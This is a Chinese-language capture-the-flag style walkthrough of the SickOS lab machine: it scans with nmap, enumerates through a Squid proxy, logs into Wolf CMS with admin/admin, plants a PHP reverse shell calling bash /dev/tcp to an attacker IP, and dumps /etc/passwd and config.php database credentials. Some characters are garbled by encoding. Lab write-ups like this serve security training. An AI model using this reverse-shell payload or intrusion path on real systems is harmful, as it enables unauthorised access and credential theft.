---
title: 红队笔记靶机--SickOS
categories: 靶机系列
---

# 红队笔记靶机--SickOS

### 1.主机发现和信息收�?

```shell

╭─ /home/kali/Desktop  with root@kali at 23:50:08 ─�?
╰─�?nmap -sn 192.168.8.0/24                                                                                                              
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-22 23:50 EDT
Nmap scan report for 192.168.8.1 (192.168.8.1)
Host is up (0.0044s latency).
MAC Address: 14:D8:64:93:00:07 (TP-Link Technologies)
Nmap scan report for 192.168.8.3 (192.168.8.3)
Host is up (0.0056s latency).
MAC Address: 14:D8:64:9B:2E:7D (TP-Link Technologies)
Nmap scan report for 192.168.8.4 (192.168.8.4)
Host is up (0.0057s latency).
MAC Address: 14:D8:64:AC:1B:D1 (TP-Link Technologies)
Nmap scan report for 192.168.8.6 (192.168.8.6)
Host is up (0.0059s latency).
MAC Address: 14:D8:64:AC:43:AC (TP-Link Technologies)
Nmap scan report for 192.168.8.20 (192.168.8.20)
Host is up (0.034s latency).
MAC Address: B8:50:D8:D0:65:E4 (Beijing Xiaomi Mobile Software)
Nmap scan report for 192.168.8.22 (192.168.8.22)
Host is up (0.037s latency).
MAC Address: B8:50:D8:D5:48:2B (Beijing Xiaomi Mobile Software)
Nmap scan report for 192.168.8.27 (192.168.8.27)
Host is up (0.072s latency).
MAC Address: C2:83:98:B1:30:E7 (Unknown)
Nmap scan report for 192.168.8.29 (192.168.8.29)
Host is up (0.000092s latency).
MAC Address: 70:08:94:2E:B7:41 (Unknown)
Nmap scan report for 192.168.8.103 (192.168.8.103)
Host is up (0.0043s latency).
MAC Address: 08:00:27:FE:CE:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.8.114 (192.168.8.114)
Host is up.
Nmap done: 256 IP addresses (10 hosts up) scanned in 2.06 seconds

```

由于靶机是Oracle VirtualBox 搭建，所以我们快速定�?ip为：192.168.8.103, 接下来对ip进行扫描�?

```shell
╭─ /home/kali/Desktop  INT with root@kali at 23:54:17 ─�?
╰─�?nmap -sT -p- --min-rate 10000 192.168.8.103                                                                                                                   
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-22 23:54 EDT
Nmap scan report for 192.168.8.103 (192.168.8.103)
Host is up (0.0020s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy
MAC Address: 08:00:27:FE:CE:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds

```

下面对进行深度扫描：

```shell
╭─ /home/kali/Desktop  took 13s with root@kali at 23:54:33 ─�?
╰─�?nmap -sT -p22,3128,8080 -sV -O -sC --min-rate 10000 192.168.8.103                                                                                                                       ─�?
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-22 23:58 EDT
Nmap scan report for 192.168.8.103 (192.168.8.103)
Host is up (0.0072s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.1.19
8080/tcp closed http-proxy
MAC Address: 08:00:27:FE:CE:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.2 - 4.14 (95%), Linux 3.8 - 3.16 (95%), Linux 3.10 - 4.11 (92%), Linux 3.13 - 4.4 (92%), Linux 3.13 (91%), Linux 3.13 - 3.16 (91%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Android 5.0 - 6.0.1 (Linux 3.4) (91%), Android 8 - 9 (Linux 3.18 - 4.4) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.93 seconds

```

接下来也对UDP进行一遍扫描，这样确保不会完全遗漏攻击面：

```shell
╭─ /home/kali/Desktop  wi
╰─�?nmap -sU 192.168.8.103                                                                                                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-23 00:05 EDT
Nmap scan report for 192.168.8.103 (192.168.8.103)
Host is up (0.016s latency).
All 1000 scanned ports on 192.168.8.103 (192.168.8.103) are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)
MAC Address: 08:00:27:FE:CE:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 21.45 seconds

╭─ /home/kali/Desktop took 22s with root@kali at 00:05:59 ─�?
╰─�?nmap -sU -p 0-1000 192.168.8.103                                                                                                                            
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-23 00:06 EDT
Nmap scan report for 192.168.8.103 (192.168.8.103)
Host is up (0.0024s latency).
All 1001 scanned ports on 192.168.8.103 (192.168.8.103) are in ignored states.
Not shown: 1001 open|filtered udp ports (no-response)
MAC Address: 08:00:27:FE:CE:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds

```

进行两次扫描对比 发现并没有开放的UDP服务

接下来进行最后一步，使用script脚本对其进行漏洞扫描

```shell
╭─ /home/kali/Desktop  took 22s with root@kali at 00:06:48 ─�?
╰─�?nmap 192.168.8.103  --script=vuln                                                                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-23 00:09 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.8.103 (192.168.8.103)
Host is up (0.0026s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy
MAC Address: 08:00:27:FE:CE:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 40.59 seconds

```

至此，信息收集阶段已经结�?

### 2.渗透测�?

经过信息收集结果，我们知道开放了22�?128端口，且为Linux服务器，22端口不优先尝试，一般只有拿到账号密码的时候才测试22端口，�?128端口为代理服务，我们可以通过代理来访问本不应该被外部访问的服务，squid支持的协议有http,ftp,gopher 无法代理ssh等其他服�?

打开3128我们发现是一个报错界�?

{% asset_img image-20260623123941252.png image-20260623123941252 %}

[报错]: 尝试取回网址时遇到以下错�?/(http://192.168.8.103:3128/)**无效的网址**请求�?URL 的某些方面不正确。一些可能的问题�?缺失或错误的访问协议(应为 http://http:// 或类�?缺少主机名非法双重逃脱不允许以主机名为非法字符;下划线。webmaster(mailto:

虽说可以通过代理访问服务，但是我们还是要�?128进行目录扫描，以防遗漏关键信�?

```shell
╭─ /home/kali/Desktop  х INT with root@kali at 21:55:22 ─�?
╰─�?dirsearch -u "http://192.168.8.103:3128/"                                                                                                                                                                    
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
from pkg_resources import DistributionNotFound, VersionConflict

 _|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/reports/http_192.168.8.103_3128/__26-06-25_21-55-31.txt

Target: http://192.168.8.103:3128/

[21:55:31] Starting:                                                                                                                                                                                                                        
[21:55:33] 400 -    3KB - /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
[21:55:33] 400 -    3KB - /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
[21:55:58] 400 -    3KB - /show_image_NpAdvCatPG.php?cache=false&cat=1&filename=
[21:56:04] 400 -    3KB - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[21:56:07] 400 -    3KB - /a4j/g/3_3_1.GAorg.richfaces.renderkit.html.Paint2DResource/DATA/
[21:56:07] 400 -    3KB - /a4j/s/3_3_3.Finalorg.ajax4jsf.resource.UserResource/n/n/DATA/
[21:56:07] 400 -    3KB - /a4j/s/3_3_3.Finalorg/richfaces/renderkit/html/css/basic_classes.xcss/DATB/
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/connectors/php/connector.php
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/connectors/php/upload.php
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp
[21:56:22] 400 -    3KB - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx
[21:56:23] 400 -    3KB - /admin/fckeditor/editor/filemanager/upload/php/upload.php
[21:56:48] 400 -    3KB - /all/modules/ogdi_field/plugins/dataTables/extras/TableTools/media/swf/ZeroClipboard.swf
[21:56:48] 400 -    3KB - /analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
[21:57:00] 400 -    3KB - /bmc_help2u/servlet/helpServlet2u?textareaWrap=/bmc_help2u/WEB-INF/web.xml
[21:57:16] 400 -    3KB - /cms/themes/cp_themes/default/images/swfupload_f9.swf
[21:57:24] 400 -    3KB - /confluence/plugins/servlet/oauth/consumers/add-manually
[21:57:32] 400 -    3KB - /docpicker/common_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
[21:57:32] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[21:57:38] 400 -    3KB - /fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[21:57:38] 400 -    3KB - /fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[21:57:38] 400 -    3KB - /fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[21:57:38] 400 -    3KB - /fckeditor/editor/filemanager/connectors/asp/connector.asp
[21:57:38] 400 -    3KB - /fckeditor/editor/filemanager/connectors/asp/upload.asp
[21:57:38] 400 -    3KB - /fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[21:57:38] 400 -    3KB - /fckeditor/editor/filemanager/connectors/php/connector.php
[21:57:40] 400 -    3KB - /filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/connectors/asp/connector.asp
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/connectors/asp/upload.asp
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/connectors/php/connector.php
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/upload/asp/upload.asp
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/connectors/php/upload.php
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/upload/aspx/upload.aspx
[21:57:50] 400 -    3KB - /includes/fckeditor/editor/filemanager/upload/php/upload.php
[21:57:54] 400 -    3KB - /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
[21:57:54] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
[21:57:54] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
[21:57:54] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
[21:57:54] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
[21:57:54] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
[21:57:54] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
[21:57:54] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
[21:57:55] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
[21:57:55] 400 -    3KB - /jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php
[21:57:57] 400 -    3KB - /learn/ruubikcms/ruubikcms/tiny_mce/plugins/filelink/filelink.php
[21:57:57] 400 -    3KB - /learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/error.log
[21:57:57] 400 -    3KB - /learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tb_standalone.js.php
[21:57:57] 400 -    3KB - /learn/ruubikcms/ruubikcms/tiny_mce/plugins/tinybrowser/tb_tinymce.js.php
[21:57:57] 400 -    3KB - /learn/ruubikcms/ruubikcms/website/scripts/jquery.lightbox-0.5.js.php
[21:58:15] 400 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage
[21:58:15] 400 -    3KB - /manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE
[21:58:15] 400 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=
[21:58:15] 400 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS
[21:58:15] 400 -    3KB - /manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY
[21:58:23] 400 -    3KB - /MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https
[21:58:48] 400 -    3KB - /p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir
[21:58:53] 400 -    3KB - /path/dataTables/extras/TableTools/media/swf/ZeroClipboard.swf
[21:59:18] 400 -    3KB - /piwigo/extensions/UserCollections/template/ZeroClipboard.swf
[21:59:20] 400 -    3KB - /plugins/sfSWFUploadPlugin/web/sfSWFUploadPlugin/swf/swfupload.swf
[21:59:20] 400 -    3KB - /plugins/servlet/gadgets/makeRequest?url=https://google.com
[21:59:20] 400 -    3KB - /plugins/sfSWFUploadPlugin/web/sfSWFUploadPlugin/swf/swfupload_f9.swf
[21:59:34] 400 -    3KB - /remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd
[21:59:34] 400 -    3KB - /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
[21:59:40] 400 -    3KB - /script/jqueryplugins/dataTables/extras/TableTools/media/swf/ZeroClipboard.swf
[21:59:40] 400 -    3KB - /scripts/ckeditor/ckfinder/core/connector/asp/connector.asp                                                     
[21:59:40] 400 -    3KB - /scripts/ckeditor/ckfinder/core/connector/php/connector.php                                                     
[21:59:40] 400 -    3KB - /scripts/ckeditor/ckfinder/core/connector/aspx/connector.aspx                                                    [21:59:47] 400 -    3KB - /servlet/com.ibm.as400ad.webfacing.runtime.httpcontroller.ControllerServlet
[21:59:47] 400 -    3KB - /servlet/com.ibm.servlet.engine.webapp.SimpleFileServlet
[21:59:47] 400 -    3KB - /servlet/com.ibm.servlet.engine.webapp.DefaultErrorReporter                         
[21:59:47] 400 -    3KB - /servlet/com.ibm.servlet.engine.webapp.UncaughtServletException
[21:59:47] 400 -    3KB - /servlet/Oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml
[21:59:48] 400 -    3KB - /servlet/Oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
[21:59:48] 400 -    3KB - /servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https
[21:59:48] 400 -    3KB - /servlet/oracle.xml.xsql.XSQLServlet/xsql/lib/XSQLConfig.xml
[21:59:48] 400 -    3KB - /servlet/oracle.xml.xsql.XSQLServlet/soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
[21:59:54] 400 -    3KB - /show_image_NpAdvMainPGThumb.php?cache=false&cat=1&filename=
[21:59:54] 400 -    3KB - /show_image_NpAdvMainFea.php?cache=false&cat=1&filename=
[21:59:54] 400 -    3KB - /show_image_NpAdvSinglePhoto.php?cache=false&cat=1&filename=
[21:59:54] 400 -    3KB - /show_image_NpAdvInnerSmall.php?cache=false&cat=1&filename=
[21:59:54] 400 -    3KB - /show_image_NpAdvFeaThumb.php?cache=false&cat=1&filename=
[21:59:54] 400 -    3KB - /show_image_NpAdvSubFea.php?cache=false&cat=1&filename=
[21:59:54] 400 -    3KB - /show_image_NpAdvSecondaryRight.php?cache=false&cat=1&filename=
[21:59:54] 400 -    3KB - /show_image_NpAdvSideFea.php?cache=false&cat=1&filename=
[22:00:02] 400 -    3KB - /sites/all/libraries/mailchimp/vendor/phpunit/phpunit/phpunit
[22:00:02] 400 -    3KB - /Sites/Knowledge/Membership/Inspired/ViewCode.asp 
[22:00:02] 400 -    3KB - /Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp
[22:00:02] 400 -    3KB - /Sites/Knowledge/Membership/Inspiredtutorial/Viewcode.asp
[22:00:02] 400 -    3KB - /Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp
[22:00:04] 400 -    3KB - /soapdocs/webapps/soap/WEB-INF/config/soapConfig.xml
[22:00:17] 400 -    3KB - /StockQuote/services/xmltoday-delayed-quotes/wsdl/
[22:00:22] 400 -    3KB - /sugarcrm/index.php?module=Accounts&action=ShowDuplicates
[22:00:22] 400 -    3KB - /sugarcrm/index.php?module=Contacts&action=ShowDuplicates
[22:00:24] 400 -    3KB - /surgemail/mtemp/surgeweb/tpl/shared/modules/swfupload_f9.swf
[22:00:24] 400 -    3KB - /surgemail/mtemp/surgeweb/tpl/shared/modules/swfupload.swf
[22:00:45] 400 -    3KB - /typo3conf/ext/static_info_tables/ext_tables_static+adt.sql
[22:00:45] 400 -    3KB - /typo3conf/ext/static_info_tables/ext_tables_static+adt-orig.sql
[22:01:03] 400 -    3KB - /wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd
[22:01:15] 400 -    3KB - /WebSphereSamples/SingleSamples/AccountAndTransfer/create.html
[22:01:16] 400 -    3KB - /WebSphereSamples/SingleSamples/Increment/increment.html
[22:01:20] 400 -    3KB - /wp-content/plugins/all-in-one-wp-migration/storage
[22:01:20] 400 -    3KB - /wp-content/plugins/backwpup/app/options-view_log-iframe.php?wpabs=
[22:01:20] 400 -    3KB - /wp-content/plugins/wp-publication-archive/includes/openfile.php?file=
[22:01:21] 400 -    3KB - /wp-content/plugins/google-sitemap-generator/sitemap-core.php
[22:01:22] 400 -    3KB - /wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
[22:01:22] 400 -    3KB - /wps/myproxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
[22:01:22] 400 -    3KB - /wps/common_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
[22:01:23] 400 -    3KB - /wps/cmis_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com
[22:01:23] 400 -    3KB - /wps/proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com

Task Completed                                                                                                                                                                                                                              


```

并没有有效信�? 接下来尝试添�?p 参数 使用http://192.168.8.103:3128 作为代理 

```shell
╭─ /home/kali/Desktop  with root@kali at 22:11:48 ─�?
╰─�?dirb  "http://192.168.8.103" -p "http://192.168.8.103:3128"
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jun 26 22:11:50 2026
URL_BASE: http://192.168.8.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: http://192.168.8.103:3128

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.8.103/ ----
+ http://192.168.8.103/.bash_history (CODE:200|SIZE:2034)                                                                                 
+ http://192.168.8.103/cgi-bin/ (CODE:403|SIZE:289)                                                                                       
+ http://192.168.8.103/connect (CODE:200|SIZE:213)                                                                                       
+ http://192.168.8.103/index (CODE:200|SIZE:21)                                                                                           
+ http://192.168.8.103/index.php (CODE:200|SIZE:21)                                                                                       
+ http://192.168.8.103/robots (CODE:200|SIZE:45)                                                                                         
+ http://192.168.8.103/robots.txt (CODE:200|SIZE:45)                                                                                     
+ http://192.168.8.103/server-status (CODE:403|SIZE:294)                                                                                 
-----------------
END_TIME: Fri Jun 26 22:12:19 2026
DOWNLOADED: 4612 - FOUND: 8

```

我们打开首页 发现出现了一个巨大的BLEHHHH!的字�?

{% asset_img image-20260627102440501.png image-20260627102440501 %}

查询这个单词的意思：是一个口语或者表示郁�?在渗透测试过程中，可能为某些系统默认页特征，接下来查看robots/robots.txt的内容：

```
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

robots.txt

```
User-agent: *
Disallow: /
Dissalow: /wolfcms
```

这里，我们得到了一个很重要的信息：

网站使用wolfcms 搭建，接下来对该站点进行扫描�?

```shell
╭─ /home/kali/Desktop · took 29s with root@kali at 22:12:19 ─�?
╰─�?dirb  "http://192.168.8.103/wolfcms" -p "http://192.168.8.103:3128/"                                                                                                                      

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jun 26 22:34:00 2026
URL_BASE: http://192.168.8.103/wolfcms/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
PROXY: http://192.168.8.103:3128/

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.8.103/wolfcms/ ----
+ http://192.168.8.103/wolfcms/composer (CODE:200|SIZE:403)                                                                                                                                 
+ http://192.168.8.103/wolfcms/config (CODE:200|SIZE:0)                                                                                                                                     
==> DIRECTORY: http://192.168.8.103/wolfcms/docs/                                                                                                                                           
+ http://192.168.8.103/wolfcms/favicon.ico (CODE:200|SIZE:894)                                                                                                                              
+ http://192.168.8.103/wolfcms/index (CODE:200|SIZE:3975)                                                                                                                                   
+ http://192.168.8.103/wolfcms/index.php (CODE:200|SIZE:3975)                                                                                                                               
==> DIRECTORY: http://192.168.8.103/wolfcms/public/                                                                                                                                         
+ http://192.168.8.103/wolfcms/robots (CODE:200|SIZE:0)                                                                                                                                     
+ http://192.168.8.103/wolfcms/robots.txt (CODE:200|SIZE:0)                                                                                                                                 
                                                                                                                                                                                            
---- Entering directory: http://192.168.8.103/wolfcms/docs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                            
---- Entering directory: http://192.168.8.103/wolfcms/public/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Jun 26 22:34:19 2026
DOWNLOADED: 4612 - FOUND: 7

```

先查看index.php页面

{% asset_img image-20260627103745950.png image-20260627103745950 %}

其中Posted by Administrator on Sat, 5 Dec 2015 我们可以得知 文章是以管理员用户或者管理员用户组身份发布的 接下来我们需要知道后台登陆页面的路径，由于目录扫描未扫出路径，这里我们去网上搜素�?

{% asset_img image-20260627105006799.png image-20260627105006799 %}

{% asset_img image-20260627105053318.png image-20260627105053318 %}

尝试弱密码：admin/admin 成功登入�?

后台�?

{% asset_img image-20260627111051915.png image-20260627111051915 %}

我们找到这个功能，向Upload file这里传入文件，或者点开Pages/layouts  嵌入webshell

我们使用第二�?，向主题网页中嵌入反向shell脚本，这样在目标中会更加隐蔽�?

{% asset_img image-20260627114603634.png image-20260627114603634 %}

添加php代码�?

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.8.114/443 0>&1'");?>
```

使用443是因为担心服务器对客户端的端口有限制 443通常为https服务，这样有很大概率能成功将shell反弹

本地监听443�?

打开wolfcms首页 触发更改样式主页的恶意php脚本

```shell
╭─ /home/kali/Desktop ··············· took 6m 23s with root@kali at 23:36:50 ─�?
╰─�?nc -lvp 443                                                              ─�?
listening on [any] 443 ...
connect to [192.168.8.114] from 192.168.8.103 [192.168.8.103] 36737
bash: no job control in this shell
bash-4.2$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash-4.2$ 
```

成功将shell回弹 

### 3.解法1:垂直越权sickos账户+垂直越权root

查看当前目录下有哪些文件�?

```shell
╭─ /home/kali/Desktop ··············· took 8m 52s with root@kali at 23:55:31 ─�?
╰─�?nc -lvp 443                                                              ─�?
listening on [any] 443 ...
connect to [192.168.8.114] from 192.168.8.103 [192.168.8.103] 36777
bash: no job control in this shell
bash-4.2$ ls
ls
CONTRIBUTING.md
README.md
composer.json
config.php
docs
favicon.ico
index.php
public
robots.txt
wolf
bash-4.2$ 
```

查看用户�?

```shell
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
bash-4.2$ 
```

得到账户：sickos  敏感文件config.php 在渗透测试过程中，config.php会包含网�?数据库配置的用户密码，可以利用这点进行撞库攻�?查看config.php

```php
<?php 

// Database information:
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
// The path can only be absolute path or :memory:
// For more info look at: www.php.net/pdo

// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');

// Should Wolf produce PHP error messages for debugging?
define('DEBUG', false);

// Should Wolf check for updates on Wolf itself and the installed plugins?
define('CHECK_UPDATES', true);

// The number of seconds before the check for a new Wolf version times out in case of problems.
define('CHECK_TIMEOUT', 3);

// The full URL of your Wolf CMS install
define('URL_PUBLIC', '/wolfcms/');

// Use httpS for the backend?
// Before enabling this, please make sure you have a working HTTP+SSL installation.
define('USE_HTTPS', false);

// Use HTTP ONLY setting for the Wolf CMS authentication cookie?
// This requests browsers to make the cookie only available through HTTP, so not javascript for example.
// Defaults to false for backwards compatibility.
define('COOKIE_HTTP_ONLY', false);

// The virtual directory name for your Wolf CMS administration section.
define('ADMIN_DIR', 'admin');

// Change this setting to enable mod_rewrite. Set to "true" to remove the "?" in the URL.
// To enable mod_rewrite, you must also change the name of "_.htaccess" in your
// Wolf CMS root directory to ".htaccess"
define('USE_MOD_REWRITE', false);

// Add a suffix to pages (simluating static pages '.html')
define('URL_SUFFIX', '.html');

// Set the timezone of your choice.
// Go here for more information on the available timezones:
// http://php.net/timezones
define('DEFAULT_TIMEZONE', 'Asia/Calcutta');

// Use poormans cron solution instead of real one.
// Only use if cron is truly not available, this works better in terms of timing
// if you have a lot of traffic.
define('USE_POORMANSCRON', false);

